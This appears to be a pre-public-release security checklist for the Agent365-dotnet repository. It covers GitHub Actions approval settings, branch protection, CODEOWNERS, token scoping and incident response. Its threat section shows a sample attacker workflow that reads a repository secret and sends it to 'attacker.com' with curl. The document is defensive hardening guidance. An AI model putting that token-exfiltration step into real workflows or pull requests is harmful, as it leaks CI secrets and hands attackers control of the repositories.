# AI-First Workflow: Pre-Public Release Checklist

## 🎯 Purpose
This checklist ensures all security controls are in place before making the Agent365-dotnet repository public.

---

## 🚨 CRITICAL SECURITY VULNERABILITY

### ⚠️ Workflow Tampering Risk

**THE PROBLEM**: When a PR is opened, GitHub Actions runs the **workflow file from the PR branch**, not from the base branch. This means:

```yaml
# Attacker's PR modifies .github/workflows/ai-first.yml
- name: Steal token
  env:
    GH_TOKEN: ${{ secrets.CROSS_REPO_CODEGEN_TOKEN }}
  run: |
    # Remove all security checks
    # Exfiltrate token
    curl https://attacker.com/steal?token=$GH_TOKEN
```

**THE IMPACT**: 
- ❌ Attacker can modify workflow to bypass ALL security checks (org check, input validation, etc.)
- ❌ Attacker can exfiltrate the PAT token to their own server
- ❌ Attacker can delete issues, create malicious PRs in all 3 repositories
- ❌ All code-based mitigations become worthless

**THE SOLUTION**: Repository setting below is **MANDATORY** and **BLOCKS PUBLIC RELEASE**

---

## ✅ Critical Security Requirements

### 1. 🔴 GitHub Actions Settings (BLOCKS PUBLIC RELEASE)

**Path**: `Settings → Actions → General`

- [ ] **Fork pull request workflows from outside collaborators**:
  - Select: ☑️ **Require approval for all outside collaborators**
  - 🔴 **CRITICAL - BLOCKS PUBLIC RELEASE**: Without this setting, attackers can modify the workflow in their PR to bypass all security and steal the PAT token!

- [ ] **Workflow permissions**:
  - Select: ⦿ **Read repository contents and packages permissions**
  - Uncheck: ☐ **Allow GitHub Actions to create and approve pull requests**

**Why This is Essential**:
- This setting ensures workflows from external PRs **do NOT run automatically**
- A maintainer must **manually review the workflow code** before approving execution
- Protection happens at GitHub's infrastructure level (cannot be bypassed by code)
- Secrets are NOT exposed to unapproved workflow runs

**Verification Steps**:
1. Enable the setting above
2. Create a test PR from a non-Microsoft account that modifies a `.cs` file
3. Verify workflow shows "Waiting for approval" and does NOT run
4. Check that no secrets are accessible to the workflow
5. Only after manual approval by a maintainer should the workflow execute

**Without this setting**: 🔴 **DO NOT MAKE REPOSITORY PUBLIC** - Token will be compromised immediately!

---

### 2. Branch Protection Rules

**Path**: `Settings → Branches → Add rule`

**Branch name pattern**: `main` (or your default branch)

- [ ] ☑️ **Require a pull request before merging**
  - [ ] ☑️ Require approvals: **2**
  - [ ] ☑️ **Require review from Code Owners**
  - [ ] ☑️ **Dismiss stale pull request approvals when new commits are pushed**

- [ ] ☑️ **Require status checks to pass before merging**
  - [ ] ☑️ Require branches to be up to date before merging

- [ ] ☑️ **Require conversation resolution before merging**

- [ ] ☑️ **Require signed commits** (recommended)

- [ ] ☑️ **Include administrators** (no exceptions!)

- [ ] ☑️ **Restrict who can push to matching branches**
  - Add: microsoft/agent365-core-maintainers (or appropriate team)

**Verification**: Try to commit directly to main → should be blocked.

---

### 3. CODEOWNERS File

**Path**: `.github/CODEOWNERS`

- [ ] Create `.github/CODEOWNERS` file with content:
```
# GitHub Actions Workflows - Security Critical
/.github/workflows/ @microsoft/agent365-security @microsoft/agent365-core-maintainers

# AI-First workflow requires security team approval
/.github/workflows/ai-first.yml @microsoft/agent365-security @microsoft/agent365-leads

# Workflow documentation
/.github/workflows/*.md @microsoft/agent365-core-maintainers

# Security documentation
/SECURITY.md @microsoft/agent365-security
/.github/CODEOWNERS @microsoft/agent365-security
```

- [ ] Replace team names with actual GitHub team slugs from your organization
- [ ] Verify teams exist and have appropriate members
- [ ] Test by creating a test PR that modifies a workflow file

**Verification**: PR modifying workflow should automatically request review from specified teams.

---

### 4. Token Configuration Review

**Path**: `Settings → Secrets and variables → Actions`

Secret name: `CROSS_REPO_CODEGEN_TOKEN`

- [ ] Verify token is a **Fine-Grained PAT** (not Classic PAT)
- [ ] Verify token owner is a **service account** (not personal account)
- [ ] Verify repository access is limited to:
  - [ ] Agent365-dotnet
  - [ ] Agent365-python
  - [ ] Agent365-nodejs
- [ ] Verify permissions are minimal:
  - [ ] Contents: Read-only ✅
  - [ ] Issues: Read and write ✅
  - [ ] Pull requests: Read and write ✅
  - [ ] Metadata: Read-only ✅
  - [ ] Organization members: Read ✅ (for membership check)
  - [ ] ❌ No admin permissions
  - [ ] ❌ No Actions permissions
  - [ ] ❌ No Packages permissions
- [ ] Verify expiration date: ≤ 90 days from now
- [ ] Document rotation schedule in team calendar

**Verification**: Run workflow and check it can create issues but cannot modify repository files.

---

### 5. Security Documentation

- [ ] Review and customize `AI-FIRST-SECURITY.md`
- [ ] Ensure contact information is up to date
- [ ] Add your team's escalation procedures
- [ ] Document who has access to rotate secrets
- [ ] Create calendar reminders for token rotation (60 days before expiry)

---

### 6. Test with External Account

**Critical**: Test security controls before going public!

- [ ] Create a test GitHub account (or use existing non-Microsoft account)
- [ ] Fork the repository
- [ ] Create a test PR with workflow trigger conditions:
  - [ ] Add `codegen-experiment` label
  - [ ] Modify a file in `src/**/*.cs`
  - [ ] Not a draft PR
- [ ] Verify workflow **does not run automatically**
- [ ] Verify organization membership check would block execution
- [ ] Have a Microsoft org member approve the PR
- [ ] Verify workflow runs after approval

---

## 🔄 Optional but Recommended

### 7. Monitoring and Alerting

- [ ] Set up notifications for workflow failures:
  - `Settings → Notifications → Actions` or use GitHub App/webhook
- [ ] Create a Slack/Teams channel for security alerts
- [ ] Set up monitoring for:
  - [ ] Failed workflow runs
  - [ ] Unusual API usage patterns
  - [ ] Rate limit warnings
  - [ ] External PRs attempting to modify workflows

### 8. Incident Response Preparation

- [ ] Document escalation contacts (security team)
- [ ] Create runbook for token compromise (see AI-FIRST-SECURITY.md)
- [ ] Ensure at least 3 people know how to:
  - [ ] Disable the workflow in emergency
  - [ ] Revoke and rotate the PAT token
  - [ ] Review workflow run logs for suspicious activity
- [ ] Schedule quarterly security review meetings

### 9. Additional Security Hardening

- [ ] Pin all GitHub Actions to specific SHA instead of tags:
  ```yaml
  # Current (less secure)
  - uses: actions/checkout@v4
  
  # Recommended (more secure)
  - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
  ```
- [ ] Enable Dependabot security updates:
  - `Settings → Security → Code security and analysis → Dependabot alerts`
- [ ] Enable secret scanning:
  - `Settings → Security → Code security and analysis → Secret scanning`
- [ ] Consider adding a security policy:
  - Create `SECURITY.md` with vulnerability reporting instructions

---

## 🎉 Final Pre-Public Checklist

Before changing repository visibility to public:

- [ ] All critical requirements (1-6) completed ✅
- [ ] Security team has reviewed and approved ✅
- [ ] Test external PR created and verified blocked ✅
- [ ] Token verified as Fine-Grained PAT with minimal scope ✅
- [ ] CODEOWNERS file reviewed by security team ✅
- [ ] Branch protection tested and working ✅
- [ ] Emergency contacts documented ✅
- [ ] Team trained on incident response procedures ✅

---

## 📞 Emergency Contacts

**If you discover a security issue:**

1. **Immediate**: Disable workflow (comment out `on:` section in `ai-first.yml`)
2. **Within 5 minutes**: Revoke `CROSS_REPO_CODEGEN_TOKEN`
3. **Contact**:
   - Security Team: [Add contact info]
   - On-call Engineer: [Add contact info]
   - Manager: [Add contact info]

**For token rotation (planned):**
- Token Owner: [Add service account contact]
- Backup Token Manager: [Add backup contact]
- Rotation Schedule: Every 90 days, documented in [calendar/system]

---

## ✅ Sign-off

When all items are complete, have the following people sign off:

- [ ] **Security Team Lead**: _______________ Date: ___________
- [ ] **Repository Maintainer**: _______________ Date: ___________
- [ ] **Engineering Manager**: _______________ Date: ___________

**Notes/Comments**:
```
[Add any additional notes or concerns here]
```

---

## 📚 Related Documentation

- [AI-FIRST-SECURITY.md](./AI-FIRST-SECURITY.md) - Complete security analysis
- [AI-FIRST-WORKFLOW.md](./AI-FIRST-WORKFLOW.md) - Workflow documentation
- [CODEOWNERS.example](../.github/CODEOWNERS.example) - CODEOWNERS template
- [GitHub Security Best Practices](https://docs.github.com/en/code-security)
